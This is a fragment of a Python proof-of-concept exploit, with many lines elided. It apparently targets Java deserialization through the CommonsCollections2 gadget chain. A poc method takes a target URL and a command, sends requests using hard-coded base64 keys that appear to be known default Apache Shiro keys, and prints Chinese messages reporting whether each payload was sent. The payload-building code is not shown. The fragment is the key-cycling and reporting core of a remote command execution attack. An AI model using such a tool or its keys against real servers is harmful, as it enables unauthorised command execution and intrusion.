    ...
    def poc(self,url, command):
        ...
        #分界线
            ...
            if(r_001.status_code==200):
                print("[+]   CommonsCollections2模块   key19:bWljcm9zAAAAAAAAAAAAAA== 已成功发送！")
                print("[+]   状态码:"+str(r_001.status_code))
            else:
                print("[-]   CommonsCollections2模块   key19:bWljcm9zAAAAAAAAAAAAAA== 发送异常！")
                print("[-]   状态码:"+str(r_001.status_code))
            ...
            if(r_002.status_code==200):
                print("[+]   CommonsCollections2模块   key20:MTIzNDU2Nzg5MGFiY2RlZg== 已成功发送！")
                print("[+]   状态码:"+str(r_002.status_code))
            else:
                print("[-]   CommonsCollections2模块   key20:MTIzNDU2Nzg5MGFiY2RlZg== 发送异常！")
                print("[-]   状态码:"+str(r_002.status_code))
            ...
            if(r_003.status_code==200):
                print("[+]   CommonsCollections2模块   key21:5AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
                print("[+]   状态码:"+str(r_003.status_code))
            else:
                print("[-]   CommonsCollections2模块   key21:5AvVhmFLUs0KTA3Kprsdag== 发送异常！")
                print("[-]   状态码:"+str(r_003.status_code))
           #后补编码
